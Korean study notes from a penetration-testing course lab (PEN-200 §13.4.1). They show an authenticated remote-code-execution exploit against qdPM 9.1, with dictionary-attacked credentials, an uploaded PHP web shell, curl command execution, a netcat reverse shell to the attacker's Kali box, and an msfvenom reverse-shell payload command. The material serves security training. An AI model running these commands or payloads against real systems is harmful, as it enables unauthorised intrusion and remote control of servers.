# 13.4.1 종합하기

> **Putting It Together** · PEN-200 §13.4.1

대상은 192.168.50.11, Kali 는 192.168.50.129. 분량 때문에 일반적인 열거 단계 일부는 생략된 시연임.

포트 스캔에서 22 와 80 이 열림. SSH 자체는 대체로 취약하지 않으므로 웹 쪽부터 봄. 접속해 보면 인공지능 개발 회사 사이트이고, About Us 에 직원 이름·이메일·입사 연도가 노출돼 있음. 지금 당장 쓸 곳은 없고 사이트 자체에서 다른 취약점도 안 보임.

웹 디렉터리 열거 도구를 돌려 `project` 디렉터리를 발견함. AI Project Management Portal 이라는 로그인 화면이고, **로그인 창 아래에 애플리케이션과 버전 "qdPM 9.1" 이 그대로 적혀 있음.** 화면에 안 드러나는 경우를 대비한 대안은 페이지 소스에서 찾는 것 — 보통 소스 하단 copyright 부근에 있음.

![[PEN200-Fig-227.png]]

*발견한 로그인 포털 — 창 아래에 qdPM 9.1 이 노출됨*

```
<div class="copyright">
     <a href="http://qdpm.net" target="_blank">qdPM 9.1</a> <br /> Copyright &copy;
2022 <a href="http://qdpm.net" target="_blank">qdpm.net</a>
</div>
```

*페이지 소스에 드러난 버전*

qdPM 은 무료 웹 기반 프로젝트 관리 소프트웨어임. "qdPM 9.1" 로 Exploit-DB 를 검색하면 관련 익스플로잇이 몇 건 나오고, 그중 최신 것이 **verified·remote·RCE** 라 조건에 맞음.

실행 전에 코드를 읽어 전제를 파악함 — 이 익스플로잇은 웹 애플리케이션의 사용자명과 비밀번호를 요구하고, **사용자명 필드는 이메일 주소 형식**임. 유효한 자격 증명이 있으면 명령 실행용 웹셸을 업로드해 줌.

이메일은 확보했지만 비밀번호는 노출된 것이 없음. 이럴 때 쓰는 수단이 사이트 내용으로 워드리스트를 생성하는 것 — 생성된 목록을 그대로 쓰거나 변형을 더해 복잡한 후보를 만듦. 앞서 찾은 이메일 4개에 사전 공격을 걸어 `george@AIDevCorp.org:AIDevCorp` 가 유효함을 확인함. 로그인하면 과제·프로젝트·일부 설정까지 열거됨.

익스플로잇은 `searchsploit -m` 으로 작업 디렉터리에 복사함.

```
kali@kali:~$ searchsploit -m 50944
  Exploit: qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)
      URL: https://www.exploit-db.com/exploits/50944
     Path: /usr/share/exploitdb/exploits/php/webapps/50944.py
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/50944.py
```

*익스플로잇을 현재 디렉터리로 복사*

인자 구성은 소스와 스크립트의 usage 절을 읽어 확정함. **usage 절이 없는 익스플로잇도 있고, 실행 전에 소스 안 변수를 직접 고쳐야 하는 것도 있음.**

```
kali@kali:~$ python3 50944.py -url http://192.168.50.11/project/ -u
george@AIDevCorp.org -p AIDevCorp
You are not able to use the designated admin account because they do not have a
myAccount page.
The DateStamp is 2022-06-15 12:19
Backdoor uploaded at - > http://192.168.50.11/project/uploads/users/420919-
backdoor.php?cmd=whoami
```

*오류 문구가 섞이지만 업로드는 성공한 상태*

⚠️ 출력에 오류처럼 보이는 문구가 나오지만 **실패로 단정하지 말 것** — 실제로는 `uploads/users/` 아래에 웹셸이 올라가 있음. `curl` 로 명령 실행 여부를 확인함.

```
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-
backdoor.php?cmd=whoami
<pre>www-data
</pre>
```

*PHP 스크립트가 www-data 로 실행됨*

목표는 리버스셸이므로 대상에 `nc` 가 있는지부터 확인함. 명령에 공백과 특수문자가 들어가므로 `--data-urlencode` 로 파라미터를 자동 URL 인코딩해 보냄.

```
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --
data-urlencode "cmd=which nc"
<pre>/usr/bin/nc
</pre>
```

*대상에 nc 가 설치돼 있음*

Kali 에서 6666 번 포트로 `nc -lvnp 6666` 리스너를 띄운 뒤, 다른 터미널에서 웹셸로 connect-back 을 실행함.

```
kali@kali:~$ curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --
data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"
```

*리버스셸 실행 — 이 터미널은 응답 없이 멈춤*

리스너 쪽으로 넘어가면 접속이 붙어 있고, 계정은 `www-data` 임.

```
kali@kali:~$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.50.129] from (UNKNOWN) [192.168.50.11] 57956
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

*리버스셸 연결 성립*

이 절의 요지 — **서비스·애플리케이션과 그 버전을 특정해 기존 익스플로잇을 찾고, 실행 전에 코드를 검토해 자신과 고객사가 악성 코드에 당하지 않게 하고, 익스플로잇이 요구하는 정보(여기서는 로그인 자격 증명)를 미리 모아 두는 것.**

> 연습 문제 중 하나는 뒤에서 다룰 내용을 필요로 함. 페이로드 생성은 `msfvenom` 을 다음 형식으로 씀. `LHOST`·`LPORT` 는 리버스셸이 되돌아올 Kali 의 IP 와 포트임.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
```
